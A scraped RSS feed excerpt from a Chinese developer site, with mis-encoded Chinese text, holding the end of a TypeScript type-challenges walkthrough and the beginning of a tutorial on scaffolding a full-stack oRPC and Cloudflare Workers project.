class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âŸº</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">Keys</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆª</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Keys</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span></span></p>
<h3 data-id="heading-40">39. Medium - 949 - AnyOf</h3>
<p>åœ¨ç±»å‹ç³»ç»Ÿä¸­å®ç°ç±»ä¼¼äº Python ä¸­ any å‡½æ•°ã€‚ç±»å‹æ¥æ”¶ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœæ•°ç»„ä¸­ä»»ä¸€ä¸ªå…ƒç´ ä¸ºçœŸï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚å¦‚æœæ•°ç»„ä¸ºç©ºï¼Œè¿”å› falseã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">AnyOf</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">any</span>[]&gt; = T[<span class="hljs-built_in">number</span>] <span class="hljs-keyword">extends</span> <span class="hljs-number">0</span> | <span class="hljs-string">''</span> | <span class="hljs-literal">false</span> | [] | <span class="hljs-literal">undefined</span> | <span class="hljs-literal">null</span> | {[<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">never</span>} ? <span class="hljs-literal">false</span> : <span class="hljs-literal">true</span>
</code></pre>
<h3 data-id="heading-41">40. Medium - 1042 - IsNever</h3>
<p>å®ç°ä¸€ä¸ªç±»å‹ <code>IsNever</code>ï¼Œå®ƒæ¥æ”¶è¾“å…¥ç±»å‹ <code>T</code>ã€‚å¦‚æœè¯¥ç±»å‹è§£æä¸º <code>never</code>ï¼Œåˆ™è¿”å› <code>true</code>ï¼Œå¦åˆ™è¿”å› <code>false</code>ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">IsNever</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">never</span>] ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>
</code></pre>
<p>è¿™é¢˜ä¹Ÿç®€å•ï¼Œä¸»è¦è€ƒå¯Ÿåˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ï¼Œå½“ä¸€ä¸ªè”åˆç±»å‹ä½œä¸ºæ³›å‹åº”ç”¨åˆ°æ¡ä»¶ç±»å‹ï¼Œä¼šæœ‰åˆ†å‘æ•ˆæœï¼Œè€Œ <code>never</code> å¯ä»¥è¢«è§†ä¸ºç©ºçš„è”åˆç±»å‹ï¼Œå®ƒè¢«åº”ç”¨äºæ¡ä»¶ç±»å‹ï¼Œä¼šç›´æ¥è¿”å› <code>never</code>ï¼Œæ‰€ä»¥éœ€è¦ç”¨ <code>[]</code> åŒ…è£¹èµ·æ¥ï¼Œé˜»æ­¢åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ã€‚</p>
<h3 data-id="heading-42">41. Medium - 1097 - IsUnion</h3>
<p>å®ç°ä¸€ä¸ªç±»å‹ <code>IsUnion</code>ï¼Œå®ƒæ¥å—è¾“å…¥ç±»å‹ <code>T</code> å¹¶è¿”å› <code>T</code> æ˜¯å¦ä¸ºè”åˆç±»å‹ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">IsUnion</span>&lt;T, F = T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">never</span>]
  ? <span class="hljs-literal">false</span>
  : T <span class="hljs-keyword">extends</span> T
    ? [F] <span class="hljs-keyword">extends</span> [T] ? <span class="hljs-literal">false</span> : <span class="hljs-literal">true</span>
  : <span class="hljs-literal">true</span>;
</code></pre>
<p>è”åˆç±»å‹ç‰¹æ®Šçš„åœ°æ–¹å°±æ˜¯åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ï¼Œé‚£å°±åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼šå¦‚ä¸Šä»£ç ï¼Œå¦‚æœ <code>T</code> æ˜¯æ¡ä»¶ç±»å‹ï¼Œé‚£ä¹ˆ <code>T</code> å’Œ <code>F</code> å°±æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¦åˆ™å®ƒä¿©æ˜¯ä¸€æ ·çš„ç±»å‹ã€‚</p>
<h2 data-id="heading-43">AIæ€»ç»“</h2>
<p>é€šè¿‡ä»¥ä¸Šé¢˜ç›®ï¼Œç³»ç»Ÿåœ°å­¦ä¹ äº† TypeScript ç±»å‹ç³»ç»Ÿçš„æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼š</p>
<p><strong>1. åŸºç¡€è¯­æ³•</strong></p>
<ul>
<li><code>keyof</code>ã€<code>extends</code>ã€<code>in</code> ä¸‰å¤§å…³é”®å­—çš„çµæ´»è¿ç”¨</li>
<li>ç´¢å¼•è®¿é—®ç±»å‹ <code>T[K]</code> å’Œ <code>T[number]</code></li>
<li><code>readonly</code> ä¿®é¥°ç¬¦ä¸ <code>as const</code> æ–­è¨€</li>
</ul>
<p><strong>2. æ¡ä»¶ç±»å‹ä¸ç±»å‹æ¨æ–­</strong></p>
<ul>
<li>æ¡ä»¶ç±»å‹ <code>A extends B ? C : D</code> æ˜¯ç±»å‹ä½“æ“çš„æ ¸å¿ƒ</li>
<li><code>infer</code> å…³é”®å­—å®ç°æ¨¡å¼åŒ¹é…å’Œç±»å‹æ¨æ–­</li>
<li><strong>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹</strong>ï¼šè”åˆç±»å‹åœ¨è£¸ç±»å‹å‚æ•°ä¸Šçš„è‡ªåŠ¨åˆ†å‘ç‰¹æ€§</li>
<li>ä½¿ç”¨ <code>[T] extends [U]</code> é˜»æ­¢åˆ†å¸ƒå¼è¡Œä¸º</li>
</ul>
<p><strong>3. æ˜ å°„ç±»å‹</strong></p>
<ul>
<li><code>[P in keyof T]</code> éå†å¯¹è±¡å±æ€§</li>
<li><code>as</code> å…³é”®å­—é‡æ˜ å°„é”®åï¼Œå¯é…åˆæ¡ä»¶ç±»å‹è¿‡æ»¤å±æ€§</li>
<li>äº¤å‰ç±»å‹ <code>&amp;</code> åˆå¹¶å¯¹è±¡å±æ€§</li>
</ul>
<p><strong>4. å…ƒç»„ä¸æ•°ç»„</strong></p>
<ul>
<li>æ‰©å±•è¿ç®—ç¬¦ <code>[...T, U]</code> åœ¨ç±»å‹å±‚é¢çš„åº”ç”¨</li>
<li><code>T[number]</code> æå–å…ƒç»„æ‰€æœ‰æˆå‘˜çš„è”åˆç±»å‹</li>
<li>å…ƒç»„çš„ <code>length</code> æ˜¯å­—é¢é‡æ•°å­—ç±»å‹</li>
</ul>
<p><strong>5. å­—ç¬¦ä¸²æ¨¡æ¿ç±»å‹</strong></p>
<ul>
<li>æ¨¡æ¿å­—ç¬¦ä¸²ç±»å‹æ”¯æŒ <code>infer</code> è¿›è¡Œæ¨¡å¼åŒ¹é…</li>
<li>å†…ç½®å·¥å…·ï¼š<code>Uppercase</code>ã€<code>Lowercase</code>ã€<code>Capitalize</code>ã€<code>Uncapitalize</code></li>
<li>è”åˆç±»å‹åœ¨æ¨¡æ¿æ’æ§½ä¸­ä¼šåŒ¹é…ä»»æ„æˆå‘˜</li>
</ul>
<p><strong>6. é€’å½’æ€ç»´</strong></p>
<ul>
<li>å¤„ç†æ•°ç»„/å­—ç¬¦ä¸²ï¼šæå–é¦–å…ƒç´  + é€’å½’å¤„ç†å‰©ä½™éƒ¨åˆ†</li>
<li>é€’å½’ç»ˆæ­¢æ¡ä»¶çš„è®¾è®¡å¾ˆå…³é”®</li>
<li>é€’å½’æ·±åº¦æœ‰é™åˆ¶ï¼Œä½†é€šå¸¸å¤Ÿç”¨</li>
</ul>
<p><strong>7. ç‰¹æ®Šç±»å‹ç‰¹æ€§</strong></p>
<ul>
<li><code>never</code> æ˜¯ç©ºè”åˆç±»å‹ï¼Œåœ¨æ¡ä»¶ç±»å‹ä¸­ä¼šç›´æ¥è¿”å›</li>
<li>äº¤å‰ç±»å‹çš„å±æ€§æ˜¯å„ç±»å‹å±æ€§çš„å¹¶é›†</li>
<li>æ³›å‹çº¦æŸ <code>T extends keyof any</code> ç¡®ä¿ç±»å‹å¯ä½œå¯¹è±¡é”®</li>
</ul>
<p><strong>æ ¸å¿ƒæŠ€å·§</strong>ï¼šå¤šæ•°éš¾é¢˜éƒ½æ˜¯åŸºç¡€è¯­æ³•çš„ç»„åˆåº”ç”¨ï¼Œå…³é”®æ˜¯ç†è§£åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹å’Œ <code>infer</code> çš„å·¥ä½œæœºåˆ¶ï¼Œç„¶åé€šè¿‡é€’å½’æ€ç»´æ‹†è§£é—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸš€ å‰ç«¯5åˆ†é’Ÿæé€Ÿè½¬å…¨æ ˆï¼orpc + cloudflare é¡¹ç›®å®è·µ]]></title>    <link>https://juejin.cn/post/7600234310964789286</link>    <guid>https://juejin.cn/post/7600234310964789286</guid>    <pubDate>2026-01-28T09:57:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600234310964789286" data-draft-id="7600238071037853705" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ å‰ç«¯5åˆ†é’Ÿæé€Ÿè½¬å…¨æ ˆï¼orpc + cloudflare é¡¹ç›®å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯,å…¨æ ˆ,Node.js"/> <meta itemprop="datePublished" content="2026-01-28T09:57:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç å°å­¦åƒ§"/> <meta itemprop="url" content="https://juejin.cn/user/255519436842030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ å‰ç«¯5åˆ†é’Ÿæé€Ÿè½¬å…¨æ ˆï¼orpc + cloudflare é¡¹ç›®å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/255519436842030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç å°å­¦åƒ§
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T09:57:39.000Z" title="Wed Jan 28 2026 09:57:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    74
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æ ‡é¢˜å…šäº†ä¸€ä¸‹å“ˆå“ˆï¼Œå…¨æ ˆè¿˜æ˜¯æœ‰å¾ˆå¤šçŸ¥è¯†è¦å­¦ä¹ çš„ï¼Œè¿™é‡Œåªæ˜¯ç®€å•ä»‹ç»ä¸€å¥—æˆ‘è§‰å¾—è¿˜ä¸é”™çš„æŠ€æœ¯æ ˆï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰å¸®åŠ©ã€‚</p>
<p>å¤§å‰æ: è¯·å…ˆæ³¨å†Œä¸€ä¸ª cloudflare è´¦æˆ·ã€‚5å—é’±ä¹°ä¸ªåŸŸåç»‘å®šåˆ° cloudflare ä¸Šï¼Œå¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„æ–‡ç« ã€‚</p>
<h2 data-id="heading-1">å¿«é€Ÿåˆ›å»ºé¡¹ç›®</h2>
<p>æˆ‘åœ¨ GitHub ä¸Šå¶ç„¶å‘ç°äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é¡¹ç›®ï¼Œæƒ³æ¨èç»™å¤§å®¶ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.better-t-stack.dev%2Fnew" target="_blank" title="https://www.better-t-stack.dev/new" ref="nofollow noopener noreferrer">www.better-t-stack.dev/new</a></p>
<p>å®ƒæä¾›äº†ä¸€ä¸ªå¯è§†åŒ–é¡µé¢ï¼Œå¯ä»¥è‡ªç”±é€‰æ‹©è‡ªå·±éœ€è¦çš„æŠ€æœ¯æ ˆï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆåˆå§‹åŒ–å‘½ä»¤ï¼Œä¸€è¡Œå‘½ä»¤å°±èƒ½åˆ›å»ºå®Œæ•´é¡¹ç›®ã€‚å³ä½¿å¯¹æŠ€æœ¯æ ˆä¸å¤ªç†Ÿæ‚‰ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ç¤¾åŒºä¸­ä½¿ç”¨äººæ•°è¾ƒå¤šçš„é¢„è®¾é…ç½®ï¼Œä¾‹å¦‚å·¦ä¸‹è§’æä¾›çš„ T3 Stackã€PERN Stack ç­‰æ–¹æ¡ˆã€‚åŒæ—¶è¿˜æ”¯æŒåœ¨çº¿é¢„è§ˆé¡¹ç›®çš„æ–‡ä»¶ç»“æ„ï¼Œæ•´ä½“ä½“éªŒåšå¾—ç›¸å½“æˆç†Ÿã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2271102e88b14775b336ce5d61648518~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=Blbzg69d9tk9nRyGhxiBE%2Fd1VFs%3D" alt="" width="100%" loading="lazy"/>
<p>è¿™æ¬¡æˆ‘é€‰æ‹©çš„æ˜¯å‰åç«¯ç»Ÿä¸€éƒ¨ç½²åˆ° Cloudflareï¼Œè¿è¡Œæ—¶ä½¿ç”¨ Cloudflare Workersï¼Œå‰åç«¯ä¹‹é—´é€šè¿‡ oRPC é€šä¿¡ã€‚å¯¹äºæŠ€æœ¯æ ˆä¸­ä¸€äº›ä¸å¤ªç†Ÿæ‚‰çš„éƒ¨åˆ†ï¼Œæˆ‘ä¼šåœ¨åæ–‡å•ç‹¬è¯´æ˜ã€‚é€šè¿‡å¤åˆ¶ç”Ÿæˆçš„å‘½ä»¤è¡Œå³å¯å®Œæˆé¡¹ç›®åˆå§‹åŒ–ï¼Œæœ€ç»ˆå¾—åˆ°çš„æ˜¯ä¸€ä¸ªå‰åç«¯å…±å­˜çš„ monorepo é¡¹ç›®ç»“æ„ï¼Œä½¿ç”¨ Turbo ç»Ÿä¸€ç®¡ç†å‰åç«¯çš„è¿è¡Œã€è°ƒè¯•å’Œæ„å»ºæµç¨‹ã€‚</p>
<p>å‰åç«¯ä»£ç å…¨éƒ¨é‡‡ç”¨ TypeScript ç¼–å†™ï¼Œå¯¹å‰ç«¯åŒå­¦éå¸¸å‹å¥½ï¼Œä¸Šæ‰‹æˆæœ¬ä¹Ÿå¾ˆä½ã€‚(é¢˜å¤–è¯: æˆ‘è§‰å¾—å†™ JS / TSçœŸå¹¸ç¦ï¼Œåº”äº†é‚£å¥è¯: èƒ½ç”¨ JS å†™çš„æœ€åéƒ½ç”¨ JS å†™ğŸ˜‚)</p>
<pre><code class="hljs language-sql" lang="sql">pnpm <span class="hljs-keyword">create</span> better<span class="hljs-operator">-</span>t<span class="hljs-operator">-</span>stack<span class="hljs-variable">@latest</span> cf<span class="hljs-operator">-</span>todo <span class="hljs-comment">--frontend tanstack-router --backend hono --runtime workers --api orpc --auth none --payments none --database sqlite --orm drizzle --db-setup d1 --package-manager pnpm --git --web-deploy cloudflare --server-deploy cloudflare --install --addons biome turborepo --examples todo</span>
</code></pre>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79eb711a8f3b43ff8c54e22288ebae02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=h4%2BOJU7pH4rQe97i6wMyojFXLrA%3D" alt="" width="100%" loading="lazy"/>
<h2 data-id="heading-2">è¿è¡Œé¡¹ç›®</h2>
<p>æˆ‘ä»¬å…ˆæŠŠé¡¹ç›®è¿è¡Œèµ·æ¥å†çœ‹çœ‹ä»£ç ã€‚æ ¹æ®æç¤ºå…ˆè¿è¡Œä¸€äº›Databaseçš„å‘½ä»¤ã€‚<code>pnpm run db:generate</code></p>
<p>ç„¶åå¯åŠ¨æœ¬åœ°çœ‹çœ‹æ•ˆæœ <code>pnpm run dev</code> ï¼ˆæ³¨: å¦‚æœé¡¹ç›®è¿è¡Œä¸èµ·æ¥ï¼Œå°è¯•å‡çº§ä¸€ä¸‹pnpmç‰ˆæœ¬ï¼Œè¿™ä¸ªmonorepoå€ŸåŠ©äº†pnpm-workspaceçš„ç‰¹æ€§ï¼Œä¸€äº› catalog å¯èƒ½éœ€è¦ pnpm é«˜ç‰ˆæœ¬æ‰æ”¯æŒã€‚ï¼‰</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ed422af36734aa6984cd8cf133ae688~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=2Fhdejo1NuZnJySMc6jMOWKfNTo%3D" alt="" width="100%" loading="lazy"/>
<p>å¯ä»¥çœ‹åˆ°é¡¹ç›®è¿è¡ŒæˆåŠŸåˆ†åˆ«åœ¨æœ¬åœ° 3001ã€3002ç«¯å£ï¼Œä½œè€…è´´å¿ƒçš„å±•ç¤ºäº†ä¸€ä¸ªTODO listç¤ºä¾‹ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef572e2054f846a2a783f54cf02097ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=nrdfDbXKnuEoHsY0dumZ8lE69fk%3D" alt="" width="100%" loading="lazy"/>
<h2 data-id="heading-3">äº†è§£ä»£ç </h2>
<h3 data-id="heading-4">æ–‡ä»¶ç»“æ„</h3>
<p>å¾ˆæ¸…çˆ½çš„æ–‡ä»¶ç»“æ„ï¼Œappsä¸‹æœ‰å‰åç«¯ï¼Œç„¶åpackagesä¸‹æ˜¯ä¸€äº›å…±ç”¨çš„å†…å®¹ï¼Œæ ¹ç›®å½•æ˜¯æ ¼å¼åŒ–çš„biomeä¸pnpmä¸turboçš„é…ç½®ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/651dbb89a668441e96b2892a8ed38ada~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=T7Kf8cRRIHOlBLhPjDzse%2BQrNdo%3D" alt="" width="50%" loading="lazy"/>
<h3 data-id="heading-5">Pnpm-workspace</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.pnpm.cn%2Fcatalogs" target="_blank" title="https://www.pnpm.cn/catalogs" ref="nofollow noopener noreferrer">www.pnpm.cn/catalogs</a> ä½¿ç”¨äº†catalogs æ–¹ä¾¿åœ¨å„ä¸ªå­åŒ…ä¸­å…±äº«åŒä¸€ä¸ªnpmåŒ…é¿å…é‡å¤å®‰è£…ã€‚</p>
